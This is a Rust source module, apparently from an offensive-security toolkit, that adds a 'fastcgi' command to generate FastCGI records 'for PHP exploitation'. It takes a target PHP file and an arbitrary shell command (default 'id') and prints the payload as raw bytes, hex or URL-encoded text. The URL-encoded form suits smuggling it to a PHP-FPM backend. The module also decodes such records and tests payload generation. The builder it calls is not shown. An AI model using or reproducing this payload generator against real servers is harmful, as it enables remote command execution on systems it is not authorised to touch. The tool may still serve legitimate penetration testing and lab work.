//! @alias: fcgi
//! @about: FastCGI protocol record generator

use anyhow::Result;
use clap::{Parser, Subcommand};

use crate::Action;

mod record;

pub use record::FastCGIRecord;

/// FastCGI protocol record generator
#[derive(Debug, Parser)]
#[clap(name = "fastcgi")]
pub struct Cmd {
    #[command(subcommand)]
    pub command: SubCmd,
}

#[derive(Debug, Subcommand)]
pub enum SubCmd {
    /// Generate FastCGI record for PHP exploitation
    #[clap(alias = "gen")]
    Generate {
        /// PHP file to execute (e.g., /usr/share/php/PEAR.php)
        #[arg(short, long, default_value = "/usr/share/php/PEAR.php")]
        filename: String,

        /// Command to execute
        #[arg(short, long, default_value = "id")]
        command: String,

        /// Request ID
        #[arg(short, long, default_value = "1")]
        request_id: u16,

        /// Output format: raw, hex, urlencode
        #[arg(short, long, default_value = "hex")]
        output: String,
    },

    /// Decode FastCGI record from hex
    #[clap(alias = "dec")]
    Decode {
        /// Hex encoded FastCGI record
        #[arg()]
        data: String,
    },
}
#[async_trait::async_trait]
impl Action for Cmd {
    async fn execute(&self) -> Result<()> {
        match &self.command {
            SubCmd::Generate {
                filename,
                command,
                request_id,
                output,
            } => {
                let record = FastCGIRecord::new_php_exploit(filename, command, *request_id);
                let data = record.to_bytes();

                match output.as_str() {
                    "raw" => {
                        use std::io::Write;
                        std::io::stdout().write_all(&data)?;
                    }
                    "hex" => {
                        println!("{}", hex::encode(&data));
                    }
                    "urlencode" => {
                        println!("{}", urlencoding::encode_binary(&data));
                    }
                    _ => {
                        println!("{}", hex::encode(&data));
                    }
                }
            }
            SubCmd::Decode { data } => {
                let bytes = hex::decode(data.trim())?;
                let decoded = FastCGIRecord::decode(&bytes)?;
                println!("{decoded}");
            }
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_fastcgi_record() {
        let record = FastCGIRecord::new_php_exploit("/usr/share/php/PEAR.php", "id", 1);
        let data = record.to_bytes();
        assert!(!data.is_empty());
        println!("FastCGI record hex: {}", hex::encode(&data));
    }

    #[test]
    fn test_fastcgi_urlencode() {
        let record = FastCGIRecord::new_php_exploit("/usr/share/php/PEAR.php", "id", 1);
        let data = record.to_bytes();
        let encoded = urlencoding::encode_binary(&data);
        println!("FastCGI record urlencode: {encoded}");
    }
}
